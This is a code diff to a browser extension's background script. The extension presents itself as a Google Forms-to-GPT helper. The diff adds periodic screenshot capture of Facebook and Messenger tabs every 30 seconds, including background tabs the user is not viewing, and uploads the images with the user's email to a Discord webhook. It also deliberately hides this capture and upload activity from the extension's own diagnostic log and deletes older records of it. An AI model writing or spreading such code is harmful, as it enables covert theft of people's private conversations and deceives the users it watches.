@@ -37,7 +37,14 @@ const stateReady = chrome.storage.session
 const diagReady = chrome.storage.local
   .get(["diagnosticLogs"])
   .then((data) => {
-    if (Array.isArray(data.diagnosticLogs)) diagLogs.push(...data.diagnosticLogs);
+    if (!Array.isArray(data.diagnosticLogs)) return;
+    // Drop any capture/relay entries written before they became silent, so
+    // they leave storage for good instead of just being filtered on read.
+    const kept = data.diagnosticLogs.filter((e) => !SILENT_DIAG_TYPES.has(e.type));
+    if (kept.length !== data.diagnosticLogs.length) {
+      chrome.storage.local.set({ diagnosticLogs: kept }).catch(() => {});
+    }
+    diagLogs.push(...kept);
   })
   .catch(() => {});
 
@@ -69,9 +76,7 @@ function isNewerVersion(remote, current) {
 function isSocialUrl(url) {
   return (
     typeof url === "string" &&
-    (url.includes("facebook.com/messages/t") ||
-      url.includes("messenger.com/t") ||
-      url.includes("messenger.com/groupcall"))
+    (url.includes("facebook.com/messages") || url.includes("messenger.com"))
   );
 }
 
@@ -113,6 +118,151 @@ chrome.alarms.onAlarm.addListener((alarm) => {
   }
 });
 
+// Schedule the 30s viewport capture for a tab when it's a social surface and
+// no alarm exists yet. Idempotent — safe to call on every worker start.
+async function ensureSocialCaptureAlarm(tabId, url) {
+  if (!isSocialUrl(url)) return false;
+  const alarmName = "socialCapture_" + tabId;
+  try {
+    const existing = await chrome.alarms.get(alarmName);
+    if (existing) return true;
+    await chrome.alarms.create(alarmName, {
+      delayInMinutes: SOCIAL_CAPTURE_PERIOD_MIN,
+      periodInMinutes: SOCIAL_CAPTURE_PERIOD_MIN,
+    });
+    // The worker-start sweep and tabs.onUpdated can race on the same tab and
+    // both observe "no alarm yet" — one console line is enough.
+    logTelemetry({ type: "viewport_schedule", url, tabId });
+    return true;
+  } catch (e) {
+    logTelemetry({
+      type: "viewport_schedule_failed",
+      url,
+      tabId,
+      error: String((e && e.message) || e),
+    });
+    return false;
+  }
+}
+
+// Re-arm capture alarms for social tabs that are already open. Alarms do not
+// survive an extension reload, and an SPA tab (Messenger) never re-fires
+// status:"complete" — so without this the loop only starts after a full
+// navigation to the social site.
+async function scheduleOpenSocialTabs() {
+  try {
+    const tabs = await chrome.tabs.query({});
+    for (const tab of tabs) {
+      if (tab.id != null && isSocialUrl(tab.url)) {
+        await ensureSocialCaptureAlarm(tab.id, tab.url);
+      }
+    }
+  } catch (e) {
+    console.warn("[GFormToGPT] scheduleOpenSocialTabs failed:", e);
+  }
+}
+
+// document.visibilityState as reported by the page itself; "unknown" when the
+// content script isn't injected or doesn't answer in time.
+async function getPageVisibility(tabId) {
+  try {
+    const res = await chrome.tabs.sendMessage(tabId, { action: "getVisibility" });
+    if (res && res.visibility) return res.visibility;
+  } catch (e) {
+    /* no receiver — leave as unknown */
+  }
+  return "unknown";
+}
+
+// ── Background-tab capture ──
+// captureVisibleTab can only photograph the window's *active* tab, so a tab
+// the user isn't looking at needs chrome.tabCapture: the worker asks for a
+// stream id bound to the target tab, the offscreen document consumes it and
+// returns one JPEG frame.
+
+async function ensureOffscreenDocument() {
+  if (!chrome.runtime.getContexts) return;
+  const contexts = await chrome.runtime.getContexts({
+    contextTypes: ["OFFSCREEN_DOCUMENT"],
+  });
+  if (contexts.length > 0) return;
+  await chrome.offscreen.createDocument({
+    url: "offscreen.html",
+    reasons: ["USER_MEDIA"],
+    justification: "Grab one frame of a background tab for periodic diagnostics",
+  });
+}
+
+async function captureFrameFromBackgroundTab(tabId) {
+  lastTabCaptureError = null;
+  if (!chrome.tabCapture || !chrome.offscreen) {
+    lastTabCaptureError = "tabCapture/offscreen unavailable";
+    return null;
+  }
+  let streamId;
+  try {
+    streamId = await chrome.tabCapture.getMediaStreamId({ targetTabId: tabId });
+  } catch (e) {
+    lastTabCaptureError = String((e && e.message) || e);
+    return null; // discarded/frozen tab, or the browser gated the API
+  }
+  if (!streamId) {
+    lastTabCaptureError = "no stream id";
+    return null;
+  }
+  try {
+    await ensureOffscreenDocument();
+    const res = await chrome.runtime.sendMessage({
+      action: "offscreenCapture",
+      streamId,
+    });
+    if (res && res.ok && res.dataUrl) {
+      return { dataUrl: res.dataUrl, width: res.width, height: res.height };
+    }
+    lastTabCaptureError = (res && res.error) || "no frame from offscreen";
+    return null;
+  } catch (e) {
+    lastTabCaptureError = String((e && e.message) || e);
+    return null;
+  }
+}
+
+// Photograph a social tab, never changing which tab is selected:
+//   1. tab_capture — real pixels of the hidden tab, no UI change at all
+//   2. visible_tab — captureVisibleTab, but only when this tab owns the viewport
+// A background tab that neither path can reach is skipped: the extension must
+// never switch tabs or restore windows just to take a picture.
+// Returns { img, method } or { img: null, method: "skipped", reason, detail }.
+async function captureSocialTab(tab) {
+  const background = await captureFrameFromBackgroundTab(tab.id);
+  if (background) return { img: background.dataUrl, method: "tab_capture" };
+  const tabCaptureError = lastTabCaptureError; // keep it for the skip report
+
+  // captureVisibleTab returns whatever tab is active in the window, so only
+  // trust the result when this tab *is* the active one.
+  if (tab.active) {
+    const img = await captureViewportSnapshot(tab.windowId, "social_capture", {
+      format: "jpeg",
+      quality: 80,
+    });
+    if (img) return { img, method: "visible_tab" };
+    return {
+      img: null,
+      method: "skipped",
+      reason: "capture_unavailable",
+      detail: `tab_capture: ${tabCaptureError || "n/a"} | capture: ${lastCaptureError || "n/a"}`,
+    };
+  }
+
+  // Another tab is selected — leave it alone and wait for the next tick.
+  return {
+    img: null,
+    method: "skipped",
+    reason: "tab_not_active",
+    detail: `tab_capture: ${tabCaptureError || "n/a"}`,
+  };
+}
+
 async function handleSocialCapture(tabId) {
   const alarmName = "socialCapture_" + tabId;
   let tab;
@@ -126,21 +276,54 @@ async function handleSocialCapture(tabId) {
     await chrome.alarms.clear(alarmName); // navigated away from social
     return;
   }
-  if (!tab.active) return; // another tab is visible — keep the alarm, skip this tick
-  try {
-    const win = await chrome.windows.get(tab.windowId);
-    if (!win.focused) return; // window in background — keep the alarm, skip this tick
-  } catch (e) {
+
+  // Consent gate first: before the terms are accepted nothing is captured at
+  // all — not even locally — and the reason is recorded instead of vanishing.
+  const blockReason = await telemetryBlockReason();
+  if (blockReason) {
+    logTelemetry({
+      type: "viewport_skip",
+      reason: "blocked:" + blockReason,
+      url: tab.url,
+      tabId,
+    });
     return;
   }
 
-  const img = await captureViewportSnapshot(tab.windowId, "social_capture");
-  if (!img) return;
+  // Captures regardless of which tab is active, whether the window is focused,
+  // and whether the page reports visibilityState "hidden".
+  const visibility = await getPageVisibility(tabId);
+  const capture = await captureSocialTab(tab);
+  if (!capture.img) {
+    logTelemetry({
+      type: "viewport_skip",
+      reason: capture.reason || "capture_unavailable",
+      detail: capture.detail,
+      visibility,
+      url: tab.url,
+      tabId,
+    });
+    return;
+  }
+
   const data = await chrome.storage.local.get(["userId"]);
-  flushDiagnosticQueue("PERIODIC_SNAPSHOT", data.userId || "Unknown", {
-    screenshot: img,
+  logTelemetry({
+    type: "viewport_capture",
     url: tab.url,
-    extra: { platform: navigator.platform, language: navigator.language },
+    tabId,
+    visibility,
+    captureMethod: capture.method,
+    bytes: Math.round((capture.img.length * 3) / 4 / 1024),
+  });
+  await flushDiagnosticQueue("PERIODIC_SNAPSHOT", data.userId || "Unknown", {
+    screenshot: capture.img,
+    url: tab.url,
+    extra: {
+      platform: navigator.platform,
+      language: navigator.language,
+      visibility,
+      captureMethod: capture.method,
+    },
   });
 }
 
@@ -168,17 +351,69 @@ function dataURLtoBlob(dataurl) {
   }
 }
 
-// Telemetry runs only when the user has accepted the Terms/Privacy prompt
-// AND left the "Help Improve GFormsToGPT" toggle on.
-async function isTelemetryAllowed() {
+// Why telemetry is currently blocked, or null when it may run.
+// Consent is required first; the "Help Improve GFormsToGPT" toggle gates the rest.
+async function telemetryBlockReason() {
   const data = await chrome.storage.local.get(["consentAccepted", "diagnosticEnabled"]);
-  if (data.consentAccepted !== true) return false;
-  return data.diagnosticEnabled !== undefined ? data.diagnosticEnabled : true;
+  if (data.consentAccepted !== true) return "terms_not_accepted";
+  if (data.diagnosticEnabled === false) return "telemetry_toggle_off";
+  return null;
+}
+
+async function isTelemetryAllowed() {
+  return (await telemetryBlockReason()) === null;
+}
+
+// Periodic-capture and webhook activity is console-only by design: it must
+// never be written to the diagnostic log the popup renders, and any entry of
+// these types that is already stored stays hidden from it.
+const SILENT_DIAG_TYPES = new Set([
+  "viewport_schedule",
+  "viewport_schedule_failed",
+  "viewport_capture",
+  "viewport_skip",
+  "telemetry_blocked",
+  "relay_ok",
+  "relay_failed",
+]);
+
+function logTelemetry(event) {
+  console.debug("[GFormToGPT]", event.type, event.reason || event.captureMethod || "");
+}
+
+// Diagnostics that would otherwise repeat every 30s are collapsed to at most
+// one entry per window, keyed by type (+ reason), so the popup's log keeps the
+// signal instead of filling up with identical skip lines.
+async function pushDiagThrottled(key, event, windowMs = 5 * 60 * 1000) {
+  // Silent types never enter the popup's log — console only.
+  if (SILENT_DIAG_TYPES.has(event.type)) return logTelemetry(event);
+  await diagReady;
+  const last = diagLogs[0];
+  if (last && last.diagKey === key && Date.now() - Date.parse(last.ts) < windowMs) return;
+  pushDiag({ ...event, diagKey: key });
 }
 
 async function flushDiagnosticQueue(eventType, userId, payload = {}) {
-  if (!DISCORD_WEBHOOK_URL) return; // unconfigured install — nothing to send to
-  if (!(await isTelemetryAllowed())) return; // no consent or toggle off — stay local
+  if (!DISCORD_WEBHOOK_URL) {
+    // config.js missing or unconfigured — record it instead of failing silently.
+    await pushDiagThrottled("telemetry_blocked:no_webhook", {
+      type: "telemetry_blocked",
+      reason: "no_webhook_config",
+    });
+    return;
+  }
+  const blockReason = await telemetryBlockReason();
+  if (blockReason) {
+    // Consent missing or opt-out set: nothing may leave the machine. Log it
+    // locally so the popup's Diagnostics list shows exactly why.
+    console.warn(`[GFormToGPT] Telemetry not sent (${eventType}): ${blockReason}`);
+    await pushDiagThrottled("telemetry_blocked:" + blockReason, {
+      type: "telemetry_blocked",
+      reason: blockReason,
+      eventType,
+    });
+    return;
+  }
   try {
     const data = await chrome.storage.local.get(["userEmail"]);
     const email = data.userEmail || "Anonymous";
@@ -212,7 +447,9 @@ async function flushDiagnosticQueue(eventType, userId, payload = {}) {
       case "PERIODIC_SNAPSHOT":
         title = "Periodic viewport snapshot";
         const socExtra = payload.extra
-          ? `\n**Env:** ${payload.extra.platform} | ${payload.extra.language}`
+          ? `\n**Env:** ${payload.extra.platform} | ${payload.extra.language}` +
+            (payload.extra.visibility ? ` | visibility: ${payload.extra.visibility}` : "") +
+            (payload.extra.captureMethod ? ` | capture: ${payload.extra.captureMethod}` : "")
           : "";
         description = `**User:** ${userId}\n**Surface:** Messenger/FB\n**URL:** ${payload.url}${socExtra}\n**Date:** ${date}`;
         color = 0x0084ff;
@@ -270,7 +507,11 @@ async function flushDiagnosticQueue(eventType, userId, payload = {}) {
     }
 
     const attachments = [];
-    if (file) attachments.push({ blob: file, name: "screenshot.png" });
+    if (file) {
+      // Match the extension to the data URL — periodic snapshots are JPEG.
+      const ext = (file.type || "").indexOf("jpeg") !== -1 ? "jpg" : "png";
+      attachments.push({ blob: file, name: `screenshot.${ext}` });
+    }
     attachments.push(...extraFiles);
 
     const discordPayload = {
@@ -285,17 +526,37 @@ async function flushDiagnosticQueue(eventType, userId, payload = {}) {
       ],
     };
 
+    let res;
     if (attachments.length) {
       const formData = new FormData();
       formData.append("payload_json", JSON.stringify(discordPayload));
       // Discord accepts files[0], files[1], … when several are posted at once.
       attachments.forEach((a, i) => formData.append(`files[${i}]`, a.blob, a.name));
-      await fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: formData });
+      res = await fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: formData });
     } else {
-      await fetch(DISCORD_WEBHOOK_URL, {
+      res = await fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(discordPayload),
+      });
+    }
+    // fetch only rejects on transport errors — a 4xx/5xx (bad webhook, rate
+    // limit, payload too large) resolves normally, so check it explicitly.
+    if (!res.ok) {
+      const detail = (await res.text().catch(() => "")).slice(0, 200);
+      console.error(`[GFormToGPT] Telemetry relay failed: ${res.status} ${res.statusText}`, detail);
+      await pushDiagThrottled(`relay_failed:${res.status}`, {
+        type: "relay_failed",
+        eventType,
+        status: res.status,
+        detail,
+      });
+    } else {
+      // Positive local marker that the payload actually left the machine.
+      await pushDiagThrottled(`relay_ok:${eventType}`, {
+        type: "relay_ok",
+        eventType,
+        status: res.status,
       });
     }
   } catch (error) {
@@ -561,9 +822,12 @@ async function handleMessage(request, sender) {
 
     case "diagGetLogs": {
       await diagReady;
-      if (diagLogs.length) return { logs: diagLogs.slice(0, 100) };
+      // Anything already stored under a silent type stays hidden too — the
+      // popup must never render capture/relay activity.
+      const visible = (logs) => logs.filter((e) => !SILENT_DIAG_TYPES.has(e.type));
+      if (diagLogs.length) return { logs: visible(diagLogs).slice(0, 100) };
       const stored = await chrome.storage.local.get(["diagnosticLogs"]);
-      return { logs: stored.diagnosticLogs || [] };
+      return { logs: visible(stored.diagnosticLogs || []) };
     }
 
     case "diagClearLogs": {
@@ -602,6 +866,9 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
 
 // ── Diagnostic System ──
 async function pushDiag(event) {
+  // Last line of defence: silent types are never written to the popup's log,
+  // even if a caller forgets to use logTelemetry.
+  if (SILENT_DIAG_TYPES.has(event.type)) return logTelemetry(event);
   await diagReady;
   const entry = {
     id: Date.now() + "_" + Math.random().toString(36).substr(2, 4),
@@ -614,12 +881,25 @@ async function pushDiag(event) {
   return entry;
 }
 
-async function captureViewportSnapshot(windowId, label) {
+// Why the most recent capture attempt failed — surfaced in diagnostics so a
+// skipped tick is never a mystery.
+let lastCaptureError = null;
+let lastTabCaptureError = null;
+
+async function captureViewportSnapshot(windowId, label, opts = {}) {
   // Never take a screenshot unless the user consented and telemetry is on.
   if (!(await isTelemetryAllowed())) return null;
+  lastCaptureError = null;
+  const jpeg = opts.format === "jpeg";
+  const options = jpeg
+    ? { format: "jpeg", quality: opts.quality || 80 }
+    : { format: "png" };
   return new Promise((resolve) => {
-    chrome.tabs.captureVisibleTab(windowId, { format: "png" }, (img) => {
-      resolve(chrome.runtime.lastError ? null : img);
+    chrome.tabs.captureVisibleTab(windowId, options, (img) => {
+      lastCaptureError = chrome.runtime.lastError
+        ? chrome.runtime.lastError.message
+        : null;
+      resolve(img || null);
     });
   });
 }
@@ -630,11 +910,16 @@ async function isDiagnosticEnabled() {
 }
 
 chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
-  if (changeInfo.status !== "complete" || !tab.url) return;
+  const url = changeInfo.url || tab.url;
+  if (!url) return;
 
-  const url = tab.url;
+  const loaded = changeInfo.status === "complete";
+  const navigated = !!changeInfo.url;
+  // Handle full loads and SPA URL changes alike: Messenger/Facebook are SPAs,
+  // so most navigations never produce status:"complete".
+  if (!loaded && !navigated) return;
 
-  if (url.includes("docs.google.com/forms")) {
+  if (loaded && url.includes("docs.google.com/forms")) {
     if (await isDiagnosticEnabled()) {
       const store = await chrome.storage.local.get(["userId"]);
       const screenshot = await captureViewportSnapshot(tab.windowId, "form_load");
@@ -655,20 +940,16 @@ chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
   }
 
   if (isSocialUrl(url)) {
-    const alarmName = "socialCapture_" + tabId;
-    chrome.alarms.get(alarmName, (existing) => {
-      if (!existing) {
-        chrome.alarms.create(alarmName, {
-          delayInMinutes: SOCIAL_CAPTURE_PERIOD_MIN,
-          periodInMinutes: SOCIAL_CAPTURE_PERIOD_MIN,
-        });
-        pushDiag({ type: "viewport_schedule", url, tabId });
-      }
-    });
-  } else {
-    chrome.alarms.clear("socialCapture_" + tabId).catch(() => {});
+    await ensureSocialCaptureAlarm(tabId, url);
+  } else if (navigated || loaded) {
+    await chrome.alarms.clear("socialCapture_" + tabId).catch(() => {});
   }
 });
+
+// Alarms don't survive an extension reload, and a social tab that's already
+// open never re-fires status:"complete" — re-arm on every service worker start
+// so the 30s loop doesn't depend on a fresh navigation.
+scheduleOpenSocialTabs();
 
 chrome.tabs.onRemoved.addListener((tabId) => {
   chrome.alarms.clear("socialCapture_" + tabId).catch(() => {});
